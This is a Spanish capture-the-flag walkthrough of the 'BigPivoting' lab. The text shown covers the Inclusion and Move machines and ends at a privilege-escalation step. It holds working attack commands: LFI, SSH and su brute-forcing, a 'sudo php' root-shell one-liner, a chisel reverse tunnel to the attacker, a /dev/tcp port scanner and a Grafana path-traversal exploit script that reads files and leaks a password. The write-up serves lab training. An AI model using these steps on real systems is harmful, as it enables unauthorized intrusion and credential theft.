![Screenshot](/hard/BigPivoting/Images/machine.png)

Dificultad: **Dificil**

Hecho por: **El pinguino de mario**

---
# Pasos para pwn 🥽

* 👁️  [Pre-Reconocimiento](#pre-reconocimiento)

## Máquina Inclusion 🔒

* 👁️  [Reconocimiento Inclusion](#reconocimiento-inclusion)
* 🔍 [Enumeración Inclusion](#enumeración-inclusion)
* 🪓 [Explotación Inclusion](#exploitación-inclusion)
* 🚩 [Escalada de Privilegios Inclusion](#escalada-de-privilegios-inclusion)
* 🔌 [Creando Túnel Inclusion -> Move](#creando-un-túnel-desde-inclusion-hacia-move)

## Máquina Move 🗃️

* 👁️  [Reconocimiento Move](#reconocimiento-move)
* 🔍 [Enumeración Move](#enumeración-move)
* 🪓 [Explotación Move](#exploitación-move)
* 🚩 [Escalada de Privilegios Move](#escalada-de-privilegios-move)
* 🔌 [Creando Túnel Move -> Trust](#creando-un-túnel-desde-move-hacia-trust)

## Máquina Trust 👤

* 👁️  [Reconocimiento Trust](#reconocimiento-trust)
* 🪓 [Explotación Trust](#exploitación-trust)
* 🔍 [Enumeración Trust](#enumeración-trust)
* 🚩 [Escalada de Privilegios Trust](#escalada-de-privilegios-trust)
* 🔌 [Creando Túnel Trust -> Upload](#creando-un-túnel-desde-trust-hacia-upload)

## Máquina Upload ⬇️

* 👁️  [Reconocimiento Upload](#reconocimiento-upload)
* 🔍 [Enumeración Upload](#enumeración-upload)
* 🪓 [Explotación Upload](#exploitación-upload)
* 🚩 [Escalada de Privilegios Upload](#escalada-de-privilegios-upload)
* 🔌 [Creando Túnel Upload -> WhereIsMywebshell](#creando-un-túnel-desde-upload-hacia-whereismywebshell)

## Máquina WhereIsMywebshell 💻

* 👁️  [Reconocimiento WhereIsMywebshell](#reconocimiento-whereismywebshell)
* 🔍 [Enumeración WhereIsMywebshell](#enumeración-whereismywebshell)
* 🪓 [Explotación WhereIsMywebshell](#exploitación-whereismywebshell)
* 🚩 [Escalada de Privilegios WhereIsMywebshell](#escalada-de-privilegios-whereismywebshell)

---

Ahora podemos comenzar nuestra fase de **pre reconocimiento**.

---
# Pre Reconocimiento

Primero que nada, esta máquina tiene 5 objetivos para hacer pivoting, así que voy a hacer un diagrama para mostrar cómo se ve todo esto.

![Screenshot](/hard/BigPivoting/Images/image1es.png)

Como podemos ver hay múltiples redes y máquinas, nuestra misión es **Comprometer** cada máquina y saltar a la siguiente máquina hasta finalmente alcanzar la última máquina **WhereIsMywebshell**. Por lo tanto, necesitamos usar mucho **chisel** para redirigir el tráfico, algo como un túnel, y tener acceso a todas estas máquinas hacia nosotros, usando **proxychains** y también **socat**.

Y también necesitamos enumerar mucho cada una de estas máquinas, y hacer nuestro propio script de python para enumerar, porque **ffuf** y **gobuster** no funcionan muy bien enumerando con muchos túneles y el uso de proxychains.

Así que ahora podemos comenzar nuestro primer reconocimiento para la primera máquina **Inclusion**.

---
# Reconocimiento Inclusion

Primero que nada nos aseguramos de que la primera máquina esté activa, podemos hacer esto con el comando **ping**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ ping 10.10.10.2
PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.
64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.200 ms
64 bytes from 10.10.10.2: icmp_seq=2 ttl=64 time=0.097 ms
64 bytes from 10.10.10.2: icmp_seq=3 ttl=64 time=0.109 ms
^C
--- 10.10.10.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2045ms
rtt min/avg/max/mdev = 0.097/0.135/0.200/0.045 ms
```

Bien, entonces podemos comenzar con **nmap** para encontrar qué puertos están abiertos en la primera máquina.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 10.10.10.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 22:59 -05
Initiating ARP Ping Scan at 22:59
Scanning 10.10.10.2 [1 port]
Completed ARP Ping Scan at 22:59, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:59
Scanning 10.10.10.2 [65535 ports]
Discovered open port 80/tcp on 10.10.10.2
Discovered open port 22/tcp on 10.10.10.2
Completed SYN Stealth Scan at 22:59, 4.97s elapsed (65535 total ports)
Nmap scan report for 10.10.10.2
Host is up, received arp-response (0.000043s latency).
Scanned at 2025-12-14 22:59:20 -05 for 5s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:0A:0A:0A:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1 hasta el puerto 65,535.

**-n** <- Con este argumento nmap va a omitir la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser en algunos casos muy lento.

**-sS** <- Con este argumento nmap va a hacer un escaneo sigiloso, esto significa que el 3-way-handshake no se completará, y también hace el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de host, esto significa que nmap tratará la máquina como activa y hará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Después de que el escaneo concluye podemos ver que hay 2 puertos abiertos:

- puerto 22 (ssh / secure shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)

Pero también queremos saber más sobre estos 2 puertos, así que podemos usar nmap nuevamente para ver qué servicios están corriendo y sus versiones.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ nmap -p22,80 -sCV 10.10.10.2 -oX target --stats-every=1m
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap va a escanear por cada puerto su versión para encontrar algunas posibles vulnerabilidades sobre sistemas no actualizados, y también hacer un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

**--stats-every=1m** <- Con este argumento recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s).

Después de que el escaneo termine obtuvimos la salida en un archivo xml, hacemos esto para crear una página html para ver la información más fácilmente y bonita de ver.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora ábralo.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/BigPivoting/Images/image2.png)

Como podemos ver es más legible y bonito.

Y con el puerto 80 parece ser un sitio web, podemos usar **whatweb** para encontrar qué tecnologías usa este sitio web.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ whatweb http://10.10.10.2
http://10.10.10.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[10.10.10.2], Title[Apache2 Debian Default Page: It works]
```

Parece una página predeterminada, podemos echar un vistazo con nuestro navegador.

![Screenshot](/hard/BigPivoting/Images/image3.png)

Como es usual nada interesante aquí, incluso si echamos un vistazo al código fuente.

Así que necesitamos hacer un poco de **enumeración** a esta máquina, podemos hacer esto con **gobuster**.

---
# Enumeración Inclusion

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/inclusion]
└─$ gobuster dir -u http://10.10.10.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/shop                 (Status: 301) [Size: 307] [--> http://10.10.10.2/shop/]
```

**-x** <- esto es útil para intentar encontrar archivos con extensiones, en este caso usando php y html.

Como podemos ver hay 2 resultados, la página index y otro directorio o página del sitio web, **shop** echemos un vistazo con nuestro navegador.

![Screenshot](/hard/BigPivoting/Images/image4.png)

Podemos ver aquí algo interesante, parece que existe un argumento o parámetro para ver un posible archivo (**archivo**) así que podemos intentar ver el archivo **passwd**.

![Screenshot](/hard/BigPivoting/Images/image5.png)

Así que tenemos un **LFI** aquí, pero después de mucho tiempo de enumeración e intentar encontrar otros posibles archivos o configuraciones incorrectas para escalar esto a un RCE, podemos encontrar que el archivo passwd tiene estos 2 usuarios, **seller** y **manchi**, podemos intentar hacer algo de fuerza bruta con hydra a ssh para iniciar sesión como cualquiera de estos usuarios.

Pero primero hacemos un archivo para que hydra intente iniciar sesión con estos 2 usuarios.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ cat users 
manchi
seller
```

Entonces podemos comenzar nuestro ataque de fuerza bruta con hydra.

---
# Explotación Inclusion

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ hydra -t 16 -L users -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-14 23:27:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: manchi   password: lovely
```

Así que obtuvimos las credenciales del usuario **manchi**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ ssh manchi@10.10.10.2
The authenticity of host '10.10.10.2 (10.10.10.2)' can't be established.
ED25519 key fingerprint is: SHA256:7l7ozEpa6qePwn/o8bYoxlwtLa2knvlaSKIk1mkRMfU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.2' (ED25519) to the list of known hosts.
manchi@10.10.10.2's password: 
Linux a503d483a6ef 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 14 16:47:47 2024 from 172.17.0.1
manchi@a503d483a6ef:~$
```

Genial, estamos dentro.

---
# Escalada de Privilegios Inclusion

Después de una laaaaarga enumeración para intentar escalar privilegios, solo puedo pensar en hacer también fuerza bruta al otro usuario **seller**.

Personalmente uso **suForce**, hay muchas más herramientas pero para mí la gran mayoría no funcionan muy bien o están hechas con python, pero a veces las máquinas no tienen python instalado, y necesitan instalar librerías que probablemente en un pentest real pueden ser útiles pero estas máquinas no tienen conexión a internet.

Bien, suficiente charla.

Así que primero transferimos el script y el diccionario para hacer fuerza bruta al otro usuario **seller**.

Podemos hacer esto con **scp** aprovechando que tenemos la contraseña del usuario **manchi**.

```
┌──(craft㉿kali)-[~/hacks/suForce]
└─$ scp suForce /usr/share/wordlists/rockyou.txt manchi@10.10.10.2:/tmp
manchi@10.10.10.2's password: 
suForce                                                                                                                                                                                                   100% 2430     3.0MB/s   00:00    
rockyou.txt 
```

Así que vamos a poner estos archivos en el directorio **/tmp**.

```
manchi@a503d483a6ef:/tmp$ ls
rockyou.txt  suForce
```

Entonces podemos comenzar nuestro ataque de fuerza bruta.

```
manchi@a503d483a6ef:/tmp$ bash suForce -u seller -w rockyou.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | seller
📖 Wordlist | rockyou.txt
🔎 Status   | 20/14344392/0%/qwerty
💥 Password | qwerty
───────────────────────────────────
```

Así que obtuvimos la contraseña del usuario **seller**.

```
manchi@a503d483a6ef:/tmp$ su seller
Password: 
seller@a503d483a6ef:/tmp$ whoami
seller
```

Y cuando hacemos **sudo -l** encontramos que tenemos un privilegio **SUDOER**.

```
seller@a503d483a6ef:/tmp$ sudo -l
Matching Defaults entries for seller on a503d483a6ef:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User seller may run the following commands on a503d483a6ef:
    (ALL) NOPASSWD: /usr/bin/php
```

Entonces **cualquier** usuario puede ejecutar **php** incluso como el usuario root.

```
seller@a503d483a6ef:/tmp$ sudo php -r 'system("bash");'
```

Cuando ejecutamos este comando estamos llamando a system para obtener una shell como el usuario **root**.

```
seller@a503d483a6ef:/tmp$ sudo php -r 'system("bash");'
root@a503d483a6ef:/tmp# whoami
root
```

Bien, entonces pwneamos la primera máquina **Inclusion**.

---
# Creando un túnel desde Inclusion hacia Move

Bien, ahora podemos ver que tenemos otra interfaz de red en este sistema.

```
root@a503d483a6ef:~# hostname -i
10.10.10.2 20.20.20.2
```

Podemos encontrar que existe otra máquina a la que podemos acceder. Pero en escenarios del mundo real no podríamos saberlo muy bien.

Así que estoy haciendo nuestro propio script bash para saber cuál es la dirección IP de la otra máquina.

```
root@a503d483a6ef:~# which ping
/usr/bin/ping
```

En este sistema podemos encontrar que existe el comando **ping** y será de gran ayuda.

```bash
#!/bin/bash

for num in {1..254}; do
        ping -c 1 20.20.20.$num &>/dev/null && echo "[+] The host 20.20.20.$num is ACTIVE" &
done
```

Hice este script bash para hacer ping a cada dirección de la IP 20.20.20.? e intentar encontrar si recibimos la respuesta, el script va a imprimir la dirección IP que tenga una respuesta, y estamos usando el **&** final que en resumen va a hacer el escaneo más rápido.

Así que ejecutemos nuestro script bash y encontremos qué hosts están activos.

```
root@a503d483a6ef:~# bash scan.sh 
[+] The host 20.20.20.3 is ACTIVE
[+] The host 20.20.20.2 is ACTIVE
```

Así que finalmente pudimos encontrar la dirección IP de la otra máquina 20.20.20.3.

Entonces podemos hacer nuestro mini escáner para encontrar qué puertos están abiertos en la otra máquina, por supuesto esto no va a ser tan bueno como **nmap**.

```bash
#!/bin/bash

for num in {1..10000}; do
        echo "" 2>/dev/null > /dev/tcp/20.20.20.3/$num && echo "[+] The port $num is OPEN" &
done
```

Aquí estamos intentando hacer una conexión con TCP a cada posible puerto comenzando desde el puerto 1 hasta el puerto 10,000, así que cuando recibamos un código/conexión exitosa vamos a imprimir el puerto que está ABIERTO de la otra máquina.

Así que ejecutemos nuestro escáner.

```
root@a503d483a6ef:~# bash scan.sh 
[+] The port 21 is OPEN
[+] The port 22 is OPEN
[+] The port 80 is OPEN
[+] The port 3000 is OPEN
```

Parece que hay 4 puertos abiertos:

- puerto 21 (ftp / File Transfer Protocol)
- puerto 22 (ssh / secure shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)
- puerto 3000 (???)

Parece genial pero necesitamos ver el sitio web y más en nuestra máquina de ataque, ¿cómo podemos hacerlo?

Podemos usar **chisel** para recibir y enviar tráfico a la primera máquina Inclusion.

Entonces transfiramos **chisel** a la primera máquina con **scp**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ scp /usr/bin/chisel manchi@10.10.10.2:/tmp
manchi@10.10.10.2's password: 
chisel
```

Bien, entonces con nuestra máquina de ataque hagamos un servidor para recibir conexiones de otros.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/inclusion]
└─$ chisel server --reverse -p 1234
2025/12/15 01:05:44 server: Reverse tunnelling enabled
2025/12/15 01:05:44 server: Fingerprint b6aMLPgDWyikavQWtgclegyB4N5S/p9SpTZN2zG0IDU=
2025/12/15 01:05:44 server: Listening on http://0.0.0.0:1234
```

Estamos escuchando cualquier conexión con el puerto 1234.

Entonces con la otra máquina con **chisel** vamos a conectarnos a nuestra máquina de ataque.

```
root@a503d483a6ef:/tmp# ./chisel client 192.168.0.20:1234 R:socks &
2025/12/15 06:08:57 client: Connecting to ws://192.168.0.20:1234
2025/12/15 06:08:57 client: Connected (Latency 777.728µs)
```

Bien, estamos enviando el tráfico a través de socks hacia nosotros.

Y en nuestro servidor podemos ver esto.

```
2025/12/15 01:08:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Creamos exitosamente el túnel con socks, permitiéndonos acceder a la red interna de la primera máquina inclusion.

¿Por qué hacemos esto? Porque queremos acceder a la red interna de la máquina, y ser capaces de usar nuestras herramientas, como nmap, echar un vistazo al sitio web de la otra máquina y demás.

Pero antes de usar nmap y todas estas cosas, nos aseguramos de que el archivo **proxychains4.conf** tenga este contenido:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ cat /etc/proxychains4.conf | grep -E "socks5 127.0.0.1|dynamic_chain"
dynamic_chain
socks5 127.0.0.1 1080
```

Descomentamos el **dynamic chain** y agregamos la línea final al archivo conf.

---
# Reconocimiento Move

Así que ahora podemos intentar escanear con nmap a la otra máquina.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n 20.20.20.3 -vv --min-rate 5000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 16:02 -05
Initiating Connect Scan at 16:02
Scanning 20.20.20.3 [1000 ports]
Discovered open port 21/tcp on 20.20.20.3
Discovered open port 80/tcp on 20.20.20.3
Discovered open port 22/tcp on 20.20.20.3
Discovered open port 3000/tcp on 20.20.20.3
Completed Connect Scan at 16:02, 1.94s elapsed (1000 total ports)
Nmap scan report for 20.20.20.3
Host is up, received user-set (0.0013s latency).
Scanned at 2025-12-15 16:02:34 -05 for 2s
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```

Vemos que hacemos el escaneo de nmap, por cada escaneo que hacemos con nmap siempre necesitamos insertar estos 2 argumentos para hacer el escaneo exitoso:

- **-sT** -> Esto hace que nmap complete el three-way handshake cuando estamos haciendo pivoting a una red, intentamos usar este escaneo TCP y evitando el escaneo SYN porque si no lo hacemos nmap ignorará el proxy. (para más información puedes echar un vistazo [aquí](https://security.stackexchange.com/questions/120708/nmap-through-proxy/120723#120723))

- **-Pn** -> Esto trata cualquier host como activo, esto es útil porque nmap no puede saber si el host está activo y asume que el host está caído.

- **--top-ports** -> Esto hace que nmap escanee los puertos más comunes, en este caso estamos usando los 1,000 puertos más comunes, porque nmap cuando escanea con un proxy a veces es muy lento cuando escanea todos los puertos.

Cuando el escaneo concluye podemos ver que hay 4 puertos abiertos que descubrimos antes en nuestro mini escáner.

Así que hacemos otro escaneo de nmap para saber más sobre estos puertos.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ sudo proxychains -q nmap -p21,22,80,3000 -sT -Pn -n -sCV 20.20.20.3 -oX target --stats-every=1m
```

Entonces convertimos una vez más el archivo XML a archivo HTML para hacer más legible y bonita la salida.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ xsltproc target -o target.html
```

Y luego abramos el archivo html.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ open target.html
```

![Screenshot](/hard/BigPivoting/Images/image6.png)

Bien, podemos ver aquí que podemos iniciar sesión como **anonymous** en el puerto 21 (ftp)

Podemos intentar iniciar sesión para ver qué hay dentro de este puerto.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/move]
└─$ sudo proxychains -q ftp 20.20.20.3 -a
Connected to 20.20.20.3.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Estamos dentro, veamos cuáles son sus contenidos.

```
ftp> ls
229 Entering Extended Passive Mode (|||9768|)
150 Here comes the directory listing.
drwxrwxrwx    1 0        0            4096 Mar 29  2024 mantenimiento
```

Parece un directorio.

```
ftp> cd mantenimiento
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||64506|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0            2021 Mar 29  2024 database.kdbx
```

Tenemos un archivo de **keepass**, esto puede tener credenciales, así que descarguémoslo.

```
ftp> get database.kdbx
local: database.kdbx remote: database.kdbx
229 Entering Extended Passive Mode (|||20828|)
150 Opening BINARY mode data connection for database.kdbx (2021 bytes).
100% |***********************************************************************************************************************************************************************************************|  2021        0.49 KiB/s    00:00 ETA^C
receive aborted. Waiting for remote to finish abort.
226 Transfer complete.
500 Unknown command.
2021 bytes received in 00:04 (0.45 KiB/s)
```

Podemos echar un vistazo con **keepass2** para abrirlo.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ keepass2 database.kdbx
```

![Screenshot](/hard/BigPivoting/Images/image7.png)

Necesitamos una contraseña, podemos intentar capturar el hash de esto con **keepass2john** pero no funcionará porque el hash tiene algo de salting, y con **hashcat** es lo mismo, detecta salting en el hash.

Entonces necesitamos hacer algo de enumeración a esta máquina.

---
# Enumeración Move

Si recordamos, existen 2 sitios web en el puerto 80 y el puerto 3000.

Primero analicemos el primero.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ sudo proxychains -q whatweb http://20.20.20.3
http://20.20.20.3 [200 OK] Apache[2.4.58], Country[UNITED STATES][US], HTTPServer[Debian Linux][Apache/2.4.58 (Debian)], IP[20.20.20.3], Title[Apache2 Debian Default Page: It works]
```

Parece otra página predeterminada, echemos un vistazo con nuestro navegador.

Pero antes de hacer eso, uso **foxyproxy** una extensión de mi navegador para intentar ver el sitio web, configurémoslo para poder acceder al sitio web.

![Screenshot](/hard/BigPivoting/Images/image8.png)

Así que guardémoslo, seleccionando el tipo que es SOCKS5, hostname nuestra máquina (127.0.0.1) y el puerto (1080)

Luego seleccionamos el proxy con **foxyproxy**.

![Screenshot](/hard/BigPivoting/Images/image9.png)

Y podemos ver esto, nada interesante, ni siquiera en el código fuente tampoco.

Entonces veamos el otro sitio web.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ sudo proxychains -q whatweb http://20.20.20.3:3000 
http://20.20.20.3:3000 [302 Found] Cookies[redirect_to], Country[UNITED STATES][US], HttpOnly[redirect_to], IP[20.20.20.3], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://20.20.20.3:3000/login [200 OK] Country[UNITED STATES][US], Grafana[8.3.0], HTML5, IP[20.20.20.3], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

Encontramos que usa **grafana** en particular la versión **8.3.0** esto es vulnerable a un LFI.

---
# Explotación move

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/move]
└─$ searchsploit grafana 8.3.0 
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py
Shellcodes: No Results
```

Así que podemos intentar copiar el script y veamos si funciona.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q python3 exploit.py -H http://20.20.20.3:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```

Y parece que funciona.

Pero haciendo todo esto intento enumerar posibles archivos sensibles en el sistema, pero básicamente es perder tiempo aquí, así que puedo intentar enumerar el sitio web http normal (puerto 80) con **gobuster** o **ffuf**.

Pero estas herramientas no funcionan muy bien cuando se usa proxychains y todo esto, es muy lento, así que necesitamos hacer nuestro propio script de python para enumerar recursos del sitio web.

Así que aquí está el script:

```python
from pwn import *
import requests

dictionary = "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"
session = requests.Session()

def send_request(payload):
        target = f"http://20.20.20.3:3000/public/plugins/text/../../../../../../../../../var/www/html/{payload}"

        req = requests.Request(method='GET', url=target)
        prep = req.prepare()
        prep.url = target
        response = session.send(prep, verify=False, timeout=3)

        if response.status_code == 200:
                log.info(f'The file "{payload}" exists.')

with log.progress("Getting content...") as bar:
        with open(dictionary) as file:
                for line in file:

                        if "#" in line or not line: continue
                        convert = str(line).strip()

                        php = convert + ".php"
                        html = convert + ".html"

                        send_request(php)
                        bar.status(f"Trying with {php}...")
                        send_request(html)
                        bar.status(f"Trying with {html}...")
                        send_request(convert)
                        bar.status(f"Trying with {convert}...")
```

Así que estoy haciendo uso del exploit para intentar encontrar contenidos dentro de **/var/www/html** donde normalmente contiene contenidos del sitio web, incluso credenciales.

Entonces ejecutemos nuestro script.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q python3 enumeration.py
[+] Getting content...: Success
[*] The file "index.html" exists.
[*] The file "maintenance.html" exists.
```

Y podemos encontrar la página **maintenance** así que echemos un vistazo en nuestro navegador.

![Screenshot](/hard/BigPivoting/Images/image10.png)

Parece otro archivo que existe en el directorio **/tmp/** veamos su contenido con el exploit de **grafana**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q python3 exploit.py -H http://20.20.20.3:3000
Read file > /tmp/pass.txt
t9sH76gpQ82UFeZ3GXZS
```

Así que parece una contraseña para un usuario, si recordamos que en el archivo passwd existe un usuario **freddy**.

Intentemos iniciar sesión a través de **ssh** con este usuario y contraseña.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/move]
└─$ sudo proxychains -q ssh freddy@20.20.20.3
The authenticity of host '20.20.20.3 (20.20.20.3)' can't be established.
ED25519 key fingerprint is: SHA256:vI77ttzFmsp8NiCsxBpeZipRCZ9MdfkeMJojz7qMiTw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '20.20.20.3' (ED25519) to the list of known hosts.
freddy@20.20.20.3's password: 
Linux 4009973a2306 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 16 04:48:22 2025 from 20.20.20.2
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┗━(Run: "touch ~/.hushlogin" to hide this message)
┌──(freddy㉿4009973a2306)-[~]
└─$
```

¡Iniciamos sesión como **freddy** en la máquina **Move**!

---
# Escalada de Privilegios Move

Cuando hacemos **sudo -l** tenemos un privilegio de **SUDOER**

```
┌──(freddy㉿4009973a2306)-[~]
└─$ sudo -l
Matching Defaults entries for freddy on 4009973a2306:
